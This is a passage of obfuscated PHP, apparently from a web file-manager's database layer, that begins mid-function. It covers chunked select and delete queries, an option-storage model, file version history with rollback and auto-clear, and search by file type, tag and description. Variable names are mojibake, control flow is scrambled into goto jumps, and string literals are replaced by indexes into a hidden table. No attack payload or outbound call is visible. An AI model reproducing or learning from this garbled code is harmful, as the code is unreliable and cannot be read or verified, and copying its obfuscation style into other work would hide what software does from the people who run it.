$E¸é¶¶Ô£í[271]); } return $Eõ‘‘±‘Ç; goto BÆ¥‹×®Íá; b…É¡ó ÉŠ: $E¸é¶¶Ô£í =& $_SERVER[¢ÌÛ]; $d•µîŠ¾½Ù = $GLOBALS[$E¸é¶¶Ô£í[6]][$E¸é¶¶Ô£í[373]]; if (!$d•µîŠ¾½Ù[$E¸é¶¶Ô£í[374]]) { return $C±Êâ–„Ïï; } goto C’ó„ĞÜ¿£; C’ó„ĞÜ¿£: if (!is_array($C±Êâ–„Ïï)) { return $C±Êâ–„Ïï; } $Eõ‘‘±‘Ç = array(); $A®İ¦—¦Û = 0; goto d‘¤ Øë–‚; BÆ¥‹×®Íá: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($b¬‚Ô’§Ô³ = array()) { goto AèÛØ ‡²ˆ; F›ºóì «: $b¬äîŠ»î° = is_array($b¬äîŠ»î°) ? $b¬äîŠ»î° : array(); $Eß‰°ì‘ = null; for ($fô®ŠÃÔ°Œ = 0; $fô®ŠÃÔ°Œ < count($b¬äîŠ»î°); $fô®ŠÃÔ°Œ += $cÊ÷¸ø‹Ü²) { $d‡Ö–¯…ŠØ = array_slice($b¬äîŠ»î°, $fô®ŠÃÔ°Œ, $cÊ÷¸ø‹Ü²); if (!is_array($d‡Ö–¯…ŠØ) || count($d‡Ö–¯…ŠØ) == 0) { break; } $bƒåÅ®«¡«[$AÆ˜óó£àº[271]][$FšÎÄ„º«µ][1] = $d‡Ö–¯…ŠØ; $this->optionsValue($bƒåÅ®«¡«); $FÊ†—††˜È = parent::select($b¬‚Ô’§Ô³); if (!$FÊ†—††˜È) { continue; } if (is_null($Eß‰°ì‘)) { $Eß‰°ì‘ = array(); } $Eß‰°ì‘ = array_merge($Eß‰°ì‘, $FÊ†—††˜È); } goto d©¥ËÈ‰‘; d©¥ËÈ‰‘: return $Eß‰°ì‘; goto cå‘Ïã¿ß¸; AèÛØ ‡²ˆ: $AÆ˜óó£àº =& $_SERVER[¢ÌÛ]; $cÊ÷¸ø‹Ü² = self::SQL_WHERE_IN_CHUNK; $bƒåÅ®«¡« = $this->optionsValue(); goto eØ¹¡ï™¦; eØ¹¡ï™¦: $FšÎÄ„º«µ = $this->findWhereField($bƒåÅ®«¡«); if (!$FšÎÄ„º«µ || isset($bƒåÅ®«¡«[$AÆ˜óó£àº[288]]) || isset($bƒåÅ®«¡«[$AÆ˜óó£àº[349]])) { return parent::select($b¬‚Ô’§Ô³); } $b¬äîŠ»î° = $bƒåÅ®«¡«[$AÆ˜óó£àº[271]][$FšÎÄ„º«µ][1]; goto F›ºóì «; cå‘Ïã¿ß¸: } public function delete($bÍçÚ†”© = array()) { goto EØ‘ªùŒ´Œ; EØ‘ªùŒ´Œ: $A„Ûøîé› =& $_SERVER[¢ÌÛ]; $Eèë¦™ß¢ = self::SQL_WHERE_IN_CHUNK; $bŠ•¿õæ“¼ = $this->optionsValue(); goto E ¡ö­‚ß; BŒĞ¹¬ŸòÊ: $Fç…â¸– = $bŠ•¿õæ“¼[$A„Ûøîé›[271]][$a…ğÅ²ÜÎª][1]; $Fç…â¸– = is_array($Fç…â¸–) ? $Fç…â¸– : array(); for ($FÖÄ¶å—èë = 0; $FÖÄ¶å—èë < count($Fç…â¸–); $FÖÄ¶å—èë += $Eèë¦™ß¢) { $dæÁĞçëô = array_slice($Fç…â¸–, $FÖÄ¶å—èë, $Eèë¦™ß¢); if (!is_array($dæÁĞçëô) || count($dæÁĞçëô) == 0) { break; } $bŠ•¿õæ“¼[$A„Ûøîé›[271]][$a…ğÅ²ÜÎª][1] = $dæÁĞçëô; $this->optionsValue($bŠ•¿õæ“¼); $eİ³æŠõ Æ += parent::delete($bÍçÚ†”©); } goto a„±‚·‰íƒ; a„±‚·‰íƒ: return $eİ³æŠõ Æ; goto F˜Õ–ï¬¢ì; E ¡ö­‚ß: $a…ğÅ²ÜÎª = $this->findWhereField($bŠ•¿õæ“¼); if (!$a…ğÅ²ÜÎª) { return parent::delete($bÍçÚ†”©); } $eİ³æŠõ Æ = 0; goto BŒĞ¹¬ŸòÊ; F˜Õ–ï¬¢ì: } private function findWhereField($AÎİ¦à÷ñ¯) { $DÔ‰ãØöÍ¸ =& $_SERVER[¢ÌÛ]; $f¥¸Íê¡‚º = self::SQL_WHERE_IN_CHUNK; if (!is_array($AÎİ¦à÷ñ¯) || !is_array($AÎİ¦à÷ñ¯[$DÔ‰ãØöÍ¸[271]])) { return !1; } foreach ($AÎİ¦à÷ñ¯[$DÔ‰ãØöÍ¸[271]] as $d”ŞŠ¸ß => $c÷¸Ÿ¶ùÑƒ) { if (is_array($c÷¸Ÿ¶ùÑƒ) && isset($c÷¸Ÿ¶ùÑƒ[0]) && is_string($c÷¸Ÿ¶ùÑƒ[0]) && strtolower($c÷¸Ÿ¶ùÑƒ[0]) == $DÔ‰ãØöÍ¸[7] && is_array($c÷¸Ÿ¶ùÑƒ[1]) && count($c÷¸Ÿ¶ùÑƒ[1]) > $f¥¸Íê¡‚º) { ignore_timeout(); return $d”ŞŠ¸ß; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\145\155\x4f\x70\164\151\157\x6e"; public $field = array(); public function listData($CÒŒòÕ±’… = false, $EÂ×ƒ Àİ¡ = "\x6d\x6f\144\151\146\171\x54\151\x6d\145", $f¾Õ¢ó¸Û“ = false) { $EóƒĞÔ”Ë† = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$EóƒĞÔ”Ë†) { return $CÒŒòÕ±’… ? null : array(); } if (!$CÒŒòÕ±’…) { $EóƒĞÔ”Ë† = array_filter(array_values($EóƒĞÔ”Ë†)); return array_sort_by($EóƒĞÔ”Ë†, $EÂ×ƒ Àİ¡, $f¾Õ¢ó¸Û“); } return $EóƒĞÔ”Ë†[$_SERVER[¢ÌÛ][382] . $CÒŒòÕ±’…]; } public function insert($Eãï’²‰¯») { goto bå‹âäÎ; bå‹âäÎ: $B±¹Òƒ¹Œ³ =& $_SERVER[¢ÌÛ]; $Eãï’²‰¯» = array_field_key($Eãï’²‰¯», $this->field); $cÑ¥ßÓË¶à = Model($this->modelType)->get($B±¹Òƒ¹Œ³[383], $this->optionType . $B±¹Òƒ¹Œ³[384]); goto eé¦÷ãŞŞ; fáá‹ÜĞ: $Eãï’²‰¯»[$B±¹Òƒ¹Œ³[83]] = time(); Model($this->modelType)->set($B±¹Òƒ¹Œ³[383], $cÑ¥ßÓË¶à, $this->optionType . $B±¹Òƒ¹Œ³[384]); Model($this->modelType)->set($B±¹Òƒ¹Œ³[382] . $cÑ¥ßÓË¶à, $Eãï’²‰¯», $this->optionType); goto AìïÒ…Á; eé¦÷ãŞŞ: $cÑ¥ßÓË¶à = $cÑ¥ßÓË¶à ? $cÑ¥ßÓË¶à : 0; $Eãï’²‰¯»[$B±¹Òƒ¹Œ³[385]] = ++$cÑ¥ßÓË¶à; $Eãï’²‰¯»[$B±¹Òƒ¹Œ³[192]] = time(); goto fáá‹ÜĞ; AìïÒ…Á: return $cÑ¥ßÓË¶à; goto BºÒ¹·óÆ¼; BºÒ¹·óÆ¼: } public function update($B†÷™ÁÇÕô, $Dó¾Ÿ¶) { goto c¼‡„ÄÊò; f¼ÛºÔÂÓÛ: return Model($this->modelType)->set($DíĞ¼•ç[382] . $B†÷™ÁÇÕô, $Dó¾Ÿ¶, $this->optionType); goto B­‹ĞÛäï–; c¼‡„ÄÊò: $DíĞ¼•ç =& $_SERVER[¢ÌÛ]; $Dó¾Ÿ¶ = array_field_key($Dó¾Ÿ¶, $this->field); $C‰¦‡²¤‹ = $this->listData($B†÷™ÁÇÕô); goto A¼×ÊÂáÓ×; A¼×ÊÂáÓ×: if (!$C‰¦‡²¤‹) { return !1; } $Dó¾Ÿ¶ = array_merge($C‰¦‡²¤‹, $Dó¾Ÿ¶); $Dó¾Ÿ¶[$DíĞ¼•ç[83]] = time(); goto f¼ÛºÔÂÓÛ; B­‹ĞÛäï–: } public function remove($F­Ë¯À›ê¤) { return Model($this->modelType)->remove($_SERVER[¢ÌÛ][382] . $F­Ë¯À›ê¤, $this->optionType); } public function clear() { $FãïÂŞŠÈ =& $_SERVER[¢ÌÛ]; Model($this->modelType)->remove($FãïÂŞŠÈ[383], $this->optionType . $FãïÂŞŠÈ[384]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($bÏÀ·Éª°´, $dÒè•­ù¡) { if (!$dÒè•­ù¡) { return !1; } $B§ÇŞË‹ = $this->listData(); $B§ÇŞË‹ = array_to_keyvalue($B§ÇŞË‹, $bÏÀ·Éª°´); return isset($B§ÇŞË‹[$dÒè•­ù¡]) ? $B§ÇŞË‹[$dÒè•­ù¡] : !1; } public function findByName($F‚Ùºó¾øç) { return $this->findByKey($_SERVER[¢ÌÛ][28], $F‚Ùºó¾øç); } protected function resetData($cÌÓé´àÒÒ) { $bÀ çŒ =& $_SERVER[¢ÌÛ]; $cÌÓé´àÒÒ = is_array($cÌÓé´àÒÒ) ? $cÌÓé´àÒÒ : array(); $bŸÁœŒïƒœ = array(); for ($d×·â½È×‹ = 0; $d×·â½È×‹ < count($cÌÓé´àÒÒ); $d×·â½È×‹++) { $bŸÁœŒïƒœ[$bÀ çŒ[382] . $cÌÓé´àÒÒ[$d×·â½È×‹][$bÀ çŒ[385]]] = $cÌÓé´àÒÒ[$d×·â½È×‹]; } return Model($this->modelType)->set($bŸÁœŒïƒœ, !1, $this->optionType); } private function getAutoName($f¼ïöÍìÕ) { $f¢Ä£‡ù«Ú = array_to_keyvalue($this->listData(), $_SERVER[¢ÌÛ][28]); if (!$f¢Ä£‡ù«Ú || !isset($f¢Ä£‡ù«Ú[$f¼ïöÍìÕ])) { return $f¼ïöÍìÕ; } for ($AÎÀÁö»®¹ = 1; $AÎÀÁö»®¹ < count($f¢Ä£‡ù«Ú); $AÎÀÁö»®¹++) { $dŒ­¿¸¢ÑÏ = $f¼ïöÍìÕ . "\50{$AÎÀÁö»®¹}\51"; if (!isset($f¢Ä£‡ù«Ú[$dŒ­¿¸¢ÑÏ])) { return $dŒ­¿¸¢ÑÏ; } } return $dŒ­¿¸¢ÑÏ; } } $A‹ÓŒÀ‘¤ = $_SERVER[$_SERVER[¢ÌÛ][386]]; goto a†´‰Œ“Äš; AŞç¼ó‚Í: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\162\x63\x65\137\150\x69\x73\x74\157\x72\171"; public function historyCount($A°Ô¡”§¤) { goto CÀš‰ÁÊ‰¶; BãÈ®Ì¾„ë: return array_to_keyvalue($ešÅ÷Û’‡, $BôÈì£•²[396], $BôÈì£•²[1690]); goto Fˆ³Ò­ ›; CÀš‰ÁÊ‰¶: $BôÈì£•² =& $_SERVER[¢ÌÛ]; if (!$A°Ô¡”§¤) { return array(); } if (is_string($A°Ô¡”§¤) || is_int($A°Ô¡”§¤)) { $A°Ô¡”§¤ = array($A°Ô¡”§¤); } goto eŞœ’†‹¤; eŞœ’†‹¤: $fåæ’í²µ = $BôÈì£•²[1885]; $a‹ÀíöİÜ½ = array($BôÈì£•²[396] => array($BôÈì£•²[7], $A°Ô¡”§¤)); $ešÅ÷Û’‡ = $this->field($fåæ’í²µ)->where($a‹ÀíöİÜ½)->group($BôÈì£•²[396])->select(); goto BãÈ®Ì¾„ë; Fˆ³Ò­ ›: } public function addHistory($F‰ŠÆŸã , $F¸·ö‰ä§ = '') { $e§…·ÍÕ… =& $_SERVER[¢ÌÛ]; $dëßÚŞŒ’ö = array($e§…·ÍÕ…[410] => $F‰ŠÆŸã [$e§…·ÍÕ…[396]], $e§…·ÍÕ…[1490] => isset($F‰ŠÆŸã [$e§…·ÍÕ…[406]]) ? $F‰ŠÆŸã [$e§…·ÍÕ…[406]] : $F‰ŠÆŸã [$e§…·ÍÕ…[405]], $e§…·ÍÕ…[446] => $F‰ŠÆŸã [$e§…·ÍÕ…[445]], $e§…·ÍÕ…[546] => $F‰ŠÆŸã [$e§…·ÍÕ…[77]], $e§…·ÍÕ…[1886] => $F¸·ö‰ä§); $bÆ¡ÄÆÙğØ = $GLOBALS[$e§…·ÍÕ…[6]][$e§…·ÍÕ…[87]][$e§…·ÍÕ…[1079]]; if ($bÆ¡ÄÆÙğØ > 1) { $this->historyAutoClear($dëßÚŞŒ’ö[$e§…·ÍÕ…[396]]); $this->add($dëßÚŞŒ’ö); } Hook::trigger($e§…·ÍÕ…[1887], $dëßÚŞŒ’ö); Model($e§…·ÍÕ…[1888])->eventFileEdit($F‰ŠÆŸã [$e§…·ÍÕ…[396]]); } private function historyAutoClear($Aº†¢“êÁ½) { goto fÑ«óïÆ‘; DÁˆ•’•îÃ: $D½”ùè® = array_slice($D½”ùè®, $AÑ²±à¹»); if (!$C… õóÊµª || !$D½”ùè®) { return; } $FŒãå´á¦É = array($A•½õ¥¨›[412] => array($A•½õ¥¨›[7], $C… õóÊµª)); goto C¿òîÜ¨£Å; C¿òîÜ¨£Å: $this->where($FŒãå´á¦É)->delete(); Model($A•½õ¥¨›[448])->remove($D½”ùè®); goto D¬‚»­¼; bé¥¶Ñ«º˜: $AÑ²±à¹» = $bğçÜó’ïÑ == $A•½õ¥¨›[1101] ? 5 : $cô¥®ª¹Í„; if ($cô¥®ª¹Í„ <= 1) { $AÑ²±à¹» = 1; } if ($AÑ²±à¹» >= 500) { return; } goto B¦¯ƒáİğ; fÑ«óïÆ‘: $A•½õ¥¨› =& $_SERVER[¢ÌÛ]; $bğçÜó’ïÑ = Model($A•½õ¥¨›[1099])->get($A•½õ¥¨›[1100]); $cô¥®ª¹Í„ = $GLOBALS[$A•½õ¥¨›[6]][$A•½õ¥¨›[87]][$A•½õ¥¨›[1079]]; goto bé¥¶Ñ«º˜; BÊƒÚâœĞè: $C… õóÊµª = array_to_keyvalue($c˜ñÕÛ¾Ã, $A•½õ¥¨›[33], $A•½õ¥¨›[385]); $C… õóÊµª = array_slice($C… õóÊµª, $AÑ²±à¹»); $D½”ùè® = array_to_keyvalue($c˜ñÕÛ¾Ã, $A•½õ¥¨›[33], $A•½õ¥¨›[445]); goto DÁˆ•’•îÃ; B¦¯ƒáİğ: $FŒãå´á¦É = array($A•½õ¥¨›[410] => $Aº†¢“êÁ½); $c˜ñÕÛ¾Ã = $this->field($A•½õ¥¨›[1889])->where($FŒãå´á¦É)->order($A•½õ¥¨›[1882])->select(); if (!$c˜ñÕÛ¾Ã || $AÑ²±à¹» >= count($c˜ñÕÛ¾Ã)) { return; } goto BÊƒÚâœĞè; D¬‚»­¼: } public function listData($A¾ÌÃº¼) { goto D‚—ØÆ«±; D‚—ØÆ«±: $d‘ß£´Ââğ =& $_SERVER[¢ÌÛ]; $cà×•Ö†îÏ = array($d‘ß£´Ââğ[410] => $A¾ÌÃº¼); $A—ï˜‰Ğ™ó = $d‘ß£´Ââğ[1890]; goto dĞ¼½èÍË‡; dĞ¼½èÍË‡: $fª¬ò»‚ğ» = $this->field($A—ï˜‰Ğ™ó)->where($cà×•Ö†îÏ)->order($d‘ß£´Ââğ[1882])->selectPage(); $this->_listAppendUser($fª¬ò»‚ğ»[$d‘ß£´Ââğ[363]]); $F·°¢ÍŸÍÊ = Model($d‘ß£´Ââğ[1099])->get($d‘ß£´Ââğ[1100]); goto Fè¸¨ØÉ; Fè¸¨ØÉ: $BÇ¸ä§îùá = 5; if ($F·°¢ÍŸÍÊ == $d‘ß£´Ââğ[1101]) { $fª¬ò»‚ğ»[$d‘ß£´Ââğ[363]] = array_slice($fª¬ò»‚ğ»[$d‘ß£´Ââğ[363]], 0, $BÇ¸ä§îùá); $fª¬ò»‚ğ»[$d‘ß£´Ââğ[360]] = array($d‘ß£´Ââğ[1891] => 1, $d‘ß£´Ââğ[1892] => 20, $d‘ß£´Ââğ[1893] => 1, $d‘ß£´Ââğ[1894] => count($fª¬ò»‚ğ»[$d‘ß£´Ââğ[363]])); } return $fª¬ò»‚ğ»; goto aƒáÛÈ‘; aƒáÛÈ‘: } protected function _listAppendUser(&$bÂ•µÂÛÖÁ) { $a‚ŸÀçë½® =& $_SERVER[¢ÌÛ]; $bÛĞÖˆóáá = array_to_keyvalue($bÂ•µÂÛÖÁ, $a‚ŸÀçë½®[33], $a‚ŸÀçë½®[1498]); $D¯ñ¾İ¬ñ = Model($a‚ŸÀçë½®[504])->userListInfo($bÛĞÖˆóáá); foreach ($bÂ•µÂÛÖÁ as &$b´»éß£) { $CĞ¸áãÛ¸Á = $b´»éß£[$a‚ŸÀçë½®[1498]]; $b´»éß£[$a‚ŸÀçë½®[405]] = $D¯ñ¾İ¬ñ[$CĞ¸áãÛ¸Á] ? $D¯ñ¾İ¬ñ[$CĞ¸áãÛ¸Á] : !1; } unset($b´»éß£); } public function fileInfo($dâè½ø…šñ) { $C«Ú´›¨ãà =& $_SERVER[¢ÌÛ]; $B£ó£„Ö¶½ = $this->tablePrefix; $F’ç¶å = "{$B£ó£„Ö¶½}\x69\x6f\137\146\x69\154\x65\40\x66\x69\x6c\x65\x73\x20\x6f\x6e\40\x66\151\x6c\x65\x73\56\x66\151\154\145\111\104\40\75\40\150\151\163\x74\157\162\171\x2e\x66\x69\x6c\x65\x49\x44"; return $this->alias($C«Ú´›¨ãà[1895])->where(array($C«Ú´›¨ãà[412] => $dâè½ø…šñ))->join($F’ç¶å, $C«Ú´›¨ãà[1896])->find(); } public function removeItem($bùŒ •äù¤) { $f¼¸Û„±£È =& $_SERVER[¢ÌÛ]; $AŠÍÇ¬¥öÓ = array($f¼¸Û„±£È[412] => $bùŒ •äù¤); $eÜÈ‘§˜Ìâ = $this->where($AŠÍÇ¬¥öÓ)->find(); if ($eÜÈ‘§˜Ìâ) { $AÛ­—·ïŒ— = $this->where($AŠÍÇ¬¥öÓ)->delete(); Model($f¼¸Û„±£È[448])->remove($eÜÈ‘§˜Ìâ[$f¼¸Û„±£È[445]]); return $AÛ­—·ïŒ—; } return !1; } public function removeBySource($c—Œ‘ñ”Ğ‹) { goto dÌĞ„öœÂ¤; dÌĞ„öœÂ¤: $B‘Û®¸³À¨ =& $_SERVER[¢ÌÛ]; if (!$c—Œ‘ñ”Ğ‹) { return !1; } if (!is_array($c—Œ‘ñ”Ğ‹)) { $c—Œ‘ñ”Ğ‹ = array($c—Œ‘ñ”Ğ‹); } goto f£— ¿ù±Ë; eëÙ…Ÿ‚šñ: return !0; goto C…¦Ø®Ü«Ş; f£— ¿ù±Ë: $b­¥íçä“Ô = array($B‘Û®¸³À¨[410] => array($B‘Û®¸³À¨[7], $c—Œ‘ñ”Ğ‹)); $a½›îö®¯ = $this->field($B‘Û®¸³À¨[446])->where($b­¥íçä“Ô)->select(); if ($a½›îö®¯) { $this->where($b­¥íçä“Ô)->delete(); $e¼ÊßµÓ­ = array_to_keyvalue($a½›îö®¯, $B‘Û®¸³À¨[33], $B‘Û®¸³À¨[445]); Model($B‘Û®¸³À¨[448])->remove($e¼ÊßµÓ­); } goto eëÙ…Ÿ‚šñ; C…¦Ø®Ü«Ş: } public function setDetail($c‡æ„­ä‡, $b›æé‚Ûß‡) { $DùÏ¬¼‘â² =& $_SERVER[¢ÌÛ]; return $this->where(array($DùÏ¬¼‘â²[412] => $c‡æ„­ä‡))->save(array($DùÏ¬¼‘â²[1886] => $b›æé‚Ûß‡)); } public function rollbackToItem($dç³¸‹®£, $C÷ğ«˜ê¶×) { goto F¿¨ŸÈáŠ‡; CİÀ’ÍÔí¨: $aä²Çåˆ– = $this->find($C÷ğ«˜ê¶×); $eğóÎœÊ¬” = array($d×Ê‡…•ì—[445] => $aä²Çåˆ–[$d×Ê‡…•ì—[445]], $d×Ê‡…•ì—[77] => $aä²Çåˆ–[$d×Ê‡…•ì—[77]], $d×Ê‡…•ì—[83] => time(), $d×Ê‡…•ì—[406] => USER_ID); Model($d×Ê‡…•ì—[774])->where(array($d×Ê‡…•ì—[396] => $dç³¸‹®£))->save($eğóÎœÊ¬”); goto FÁó‡ôÑÍ; FÁó‡ôÑÍ: return $this->where(array($d×Ê‡…•ì—[412] => $C÷ğ«˜ê¶×))->delete(); goto f·ùôŒĞõ; F¿¨ŸÈáŠ‡: $d×Ê‡…•ì— =& $_SERVER[¢ÌÛ]; $F ğóŠÆáÏ = Model($d×Ê‡…•ì—[774])->sourceInfo($dç³¸‹®£); $this->addHistory($F ğóŠÆáÏ, LNG($d×Ê‡…•ì—[1897])); goto CİÀ’ÍÔí¨; f·ùôŒĞõ: } public function clearSame($A˜÷š‰İƒœ) { goto Fèìº «÷å; Fèìº «÷å: $f¥Ó˜¨’œõ =& $_SERVER[¢ÌÛ]; $BŠ—ÂŞÀ = $this->listData($A˜÷š‰İƒœ); $bê‘•Šî–æ = array_to_keyvalue_group($BŠ—ÂŞÀ, $f¥Ó˜¨’œõ[445]); goto FãäöÏ±Ê; d“²£ÖŸ”›: if (!$cÌ¼çÈÔ†Ğ) { return; } $this->where(array($f¥Ó˜¨’œõ[385] => array($f¥Ó˜¨’œõ[7], $cÌ¼çÈÔ†Ğ)))->delete(); Model($f¥Ó˜¨’œõ[448])->remove($A‹ÏÇ™í©ò); goto cÌ¹ÅÏ––©; FãäöÏ±Ê: $A‹ÏÇ™í©ò = array(); $cÌ¼çÈÔ†Ğ = array(); foreach ($bê‘•Šî–æ as $c²ò„ê† ë) { if (!$c²ò„ê† ë || count($c²ò„ê† ë) <= 1) { continue; } foreach ($c²ò„ê† ë as $C™÷¸…‚àÔ) { $A‹ÏÇ™í©ò[] = $C™÷¸…‚àÔ[$f¥Ó˜¨’œõ[445]]; $cÌ¼çÈÔ†Ğ[] = $C™÷¸…‚àÔ[$f¥Ó˜¨’œõ[385]]; } } goto d“²£ÖŸ”›; cÌ¹ÅÏ––©: } public function userSpace() { $D‘‹êŠó£ =& $_SERVER[¢ÌÛ]; $a¹à‘öĞ“ = $this->tablePrefix; $Có¬ö•ŠÎí = array($D‘‹êŠó£[1490] => USER_ID); $F™í¦ÖŠÖ¾ = "{$a¹à‘öĞ“}\151\157\137\x66\x69\154\x65\x20\x66\x69\154\145\163\x20\x6f\x6e\x20\146\x69\154\145\x73\x2e\x66\151\154\145\111\104\x20\x3d\x20\150\151\x73\x74\157\162\171\56\x66\x69\154\145\111\x44"; return $this->alias($D‘‹êŠó£[1895])->where($Có¬ö•ŠÎí)->join($F™í¦ÖŠÖ¾, $D‘‹êŠó£[1896])->sum($D‘‹êŠó£[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($e”‰¯ÜÈ»‰) { goto D÷ŒÀÑËáâ; C»¬¢ĞÕ¯´: if (!$fÎğ”‡ÄÍ‚) { return array(); } $AÊÔÀÌ‡Şò = $fÎğ”‡ÄÍ‚[$aÈ¦·Æ®¹Ø[167]]; $aäÓ¬ƒËø = $aÈ¦·Æ®¹Ø[7]; goto AÇ˜³•—¯Œ; AÇ˜³•—¯Œ: if (!$fÎğ”‡ÄÍ‚[$aÈ¦·Æ®¹Ø[167]]) { $fİ˜¨ğ¹· = array_to_keyvalue($f•«øõ‘©Ò, $aÈ¦·Æ®¹Ø[33], $aÈ¦·Æ®¹Ø[167]); $AÊÔÀÌ‡Şò = implode($aÈ¦·Æ®¹Ø[47], $fİ˜¨ğ¹·); $aäÓ¬ƒËø = $aÈ¦·Æ®¹Ø[1898]; } $C‹õ…¨«Ã = explode($aÈ¦·Æ®¹Ø[47], trim($AÊÔÀÌ‡Şò, $aÈ¦·Æ®¹Ø[47])); return array($aäÓ¬ƒËø, $C‹õ…¨«Ã); goto FÌ–‹“ŠÌ´; D÷ŒÀÑËáâ: $aÈ¦·Æ®¹Ø =& $_SERVER[¢ÌÛ]; $f•«øõ‘©Ò = KodIO::fileTypeList(); $fÎğ”‡ÄÍ‚ = $f•«øõ‘©Ò[$e”‰¯ÜÈ»‰]; goto C»¬¢ĞÕ¯´; FÌ–‹“ŠÌ´: } public function listPathType($cáÚÜõ˜çë) { $cšî›ï±Ó =& $_SERVER[¢ÌÛ]; $d×æˆøÇÉŞ = $this->fileTypeWhere($cáÚÜõ˜çë); if (!$d×æˆøÇÉŞ) { return array(); } $EÓÚî‘»õÇ = array($cšî›ï±Ó[547] => SourceModel::TYPE_USER, $cšî›ï±Ó[548] => USER_ID, $cšî›ï±Ó[544] => 0, $cšî›ï±Ó[545] => $d×æˆøÇÉŞ); return $this->listSource($EÓÚî‘»õÇ); } public function listSearch($dğšŠ‘óÕ, $DÂô‘óÈÒÍ = 300) { goto DÛó§æ¥ì¦; F„¥Š³ˆ¨Ç: if (!isset($Dáí¨ç”¢ñ[$c­½œß†Ìí[423]])) { $Dáí¨ç”¢ñ[$c­½œß†Ìí[423]] = 0; } $EË±½¼˜Ú™ = $c­½œß†Ìí[1900]; $e÷¥ß–ˆ¤ = $EË±½¼˜Ú™; goto aãÈñ´Á°÷; dÌƒ»íêÃ¯: return $fƒïãòï±Ê; goto aä¨º°—î; a³¨ƒ®ë´: $fƒïãòï±Ê = $this->distinct(!0)->field($EË±½¼˜Ú™)->where($Dáí¨ç”¢ñ)->selectPage($DÂô‘óÈÒÍ); $this->_listSearchDesc($fƒïãòï±Ê, $dğšŠ‘óÕ, $e÷¥ß–ˆ¤); $this->_listSearchTag($fƒïãòï±Ê, $dğšŠ‘óÕ, $e÷¥ß–ˆ¤); goto f˜Ÿ©…­½®; f˜Ÿ©…­½®: $this->_listSearchGroupTag($fƒïãòï±Ê, $dğšŠ‘óÕ, $e÷¥ß–ˆ¤); $this->_listDataApply($fƒïãòï±Ê[$c­½œß†Ìí[363]]); $this->_listMake($fƒïãòï±Ê); goto dÌƒ»íêÃ¯; DÛó§æ¥ì¦: $c­½œß†Ìí =& $_SERVER[¢ÌÛ]; if (isset($dğšŠ‘óÕ[$c­½œß†Ìí[1742]]) && $dğšŠ‘óÕ[$c­½œß†Ìí[1742]]) { $dğšŠ‘óÕ[$c­½œß†Ìí[1742]] = str_replace($c­½œß†Ìí[376], $c­½œß†Ìí[1899], trim($dğšŠ‘óÕ[$c­½œß†Ìí[1742]])); } $Dáí¨ç”¢ñ = $this->_parseSearchWhere($dğšŠ‘óÕ); goto F„¥Š³ˆ¨Ç; aãÈñ´Á°÷: $this->_listSearchBindPinyin($dğšŠ‘óÕ, $Dáí¨ç”¢ñ, $EË±½¼˜Ú™); $this->alias($c­½œß†Ìí[514])->_makeOrder(); $Dáí¨ç”¢ñ = $this->parseWhereLike($Dáí¨ç”¢ñ); goto a³¨ƒ®ë´; aä¨º°—î: } private function _listSearchTag(&$CäÉöŠÎ–£, $F—ì¼ì¥Î, $bœã¬õÅì¶) { goto eìØÚÆÒÒ; BˆªŞ¸Š‘: $f¿±³Íô§ = array(); $e¨‚µ÷Ïµ = $F—ì¼ì¥Î[$bÓ­Œ©À¼[1742]]; foreach ($DÔÌ£„‚Î as $BõŠíœä) { $d¯éÅ²²› = $BõŠíœä[$bÓ­Œ©À¼[28]]; $F›‹Õ‹ã¸ = str_replace($bÓ­Œ©À¼[50], $bÓ­Œ©À¼[33], Pinyin::encode($d¯éÅ²²›)); if (stripos($d¯éÅ²²›, $e¨‚µ÷Ïµ) !== !1 || stripos($F›‹Õ‹ã¸, $e¨‚µ÷Ïµ) !== !1) { $f¿±³Íô§[] = $BõŠíœä[$bÓ­Œ©À¼[385]]; } } goto cÎô…¹Ûæ; c¾¸© ©: $EîÅé—‰ß = array_to_keyvalue($EîÅé—‰ß, $bÓ­Œ©À¼[33], $bÓ­Œ©À¼[75]); $Fô—ø°˜Ç = array_unique($EîÅé—‰ß); $this->_listSearchMerge($CäÉöŠÎ–£, $F—ì¼ì¥Î, $bœã¬õÅì¶, $Fô—ø°˜Ç); goto d—£Œƒ·Àò; eìØÚÆÒÒ: $bÓ­Œ©À¼ =& $_SERVER[¢ÌÛ]; if (!$F—ì¼ì¥Î[$bÓ­Œ©À¼[1742]] || $CäÉöŠÎ–£[$bÓ­Œ©À¼[360]][$bÓ­Œ©À¼[349]] > 1) { return; } $DÔÌ£„‚Î = Model($bÓ­Œ©À¼[1901])->listData(); goto BˆªŞ¸Š‘; cÎô…¹Ûæ: if (!$f¿±³Íô§) { return; } $eé‘µ†ÍĞ§ = array($bÓ­Œ©À¼[419] => array($bÓ­Œ©À¼[7], $f¿±³Íô§), $bÓ­Œ©À¼[1498] => USER_ID); $EîÅé—‰ß = Model($bÓ­Œ©À¼[420])->field($bÓ­Œ©À¼[75])->where($eé‘µ†ÍĞ§)->select(); goto c¾¸© ©; d—£Œƒ·Àò: } private function _listSearchDesc(&$C¯»ÔƒğîÑ, $EÀä­Ø™‹â, $FÁŞÙØãÖÂ) { goto Dò×Õ«‹‡š; dÙß×µí®“: $fššà­Áö§ = array_unique($fššà­Áö§); if (!$fššà­Áö§) { return; } $f˜Å ’·Ë¡ = array($DùòÁœÓ›À[396] => array($DùòÁœÓ›À[7], $fššà­Áö§), $DùòÁœÓ›À[92] => $DùòÁœÓ›À[431], $DùòÁœÓ›À[368] => array($DùòÁœÓ›À[375], $DùòÁœÓ›À[1744] . $EÀä­Ø™‹â[$DùòÁœÓ›À[1742]] . $DùòÁœÓ›À[1744])); goto E¢¥à—Ë†É; E¢¥à—Ë†É: $cïäí°ÏÁ‘ = Model($DùòÁœÓ›À[530])->field($DùòÁœÓ›À[396])->where($f˜Å ’·Ë¡)->select(); $b¬•ÀğÌ† = array_to_keyvalue($cïäí°ÏÁ‘, $DùòÁœÓ›À[33], $DùòÁœÓ›À[396]); 